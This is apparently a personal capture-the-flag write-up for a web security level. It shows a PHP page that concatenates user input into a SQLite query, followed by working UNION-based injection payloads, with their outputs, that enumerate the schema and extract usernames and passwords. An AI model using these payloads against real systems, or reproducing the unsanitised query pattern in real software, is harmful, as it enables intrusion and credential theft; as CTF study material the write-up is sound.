#### level01-sqlite3.27.2 injection
in this level 
```
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```

The problem is using SQLite and the query is vulnerable to Injection because they use our input without sanitize anything.

```

input => 2 UNION SELECT 1,1/*
output => Other User Details: 
          id -> 1
          username -> 1
 
input => 2 UNION SELECT 1,sql from sqlite_master/*
output => Other User Details: 
          id -> 1
          username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
          
input => 2222 UNION SELECT username,password from users/*
output => Other User Details: 
          id -> ExampleUser
          username -> ExampleUserPassword
          
input => 2222 UNION SELECT username,password from users limit 2,1/*
output => Other User Details: 
          id -> levelone
          username -> WEBSEC{S[READCATED]injection}
```

**Note:** Within SQLite we could get what table and column information using default sqlite_master tables just like information_schema in mysql


/* SAME AS ;-- IN THIS CASE



#### extra 


get schema:
`0 UNION SELECT 1,sql FROM sqlite_master  
*![[Pasted image 20251015102454.png]]*

gets sqlite version:

and also proves to you that web is using sql lite
`0 UNION SELECT 1,sqlite_version()`  

gets table name:

0 UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';--


gets column name:

0 UNION SELECT 1,sql FROM sqlite_master WHERE tbl_name='users' AND type ='table';--

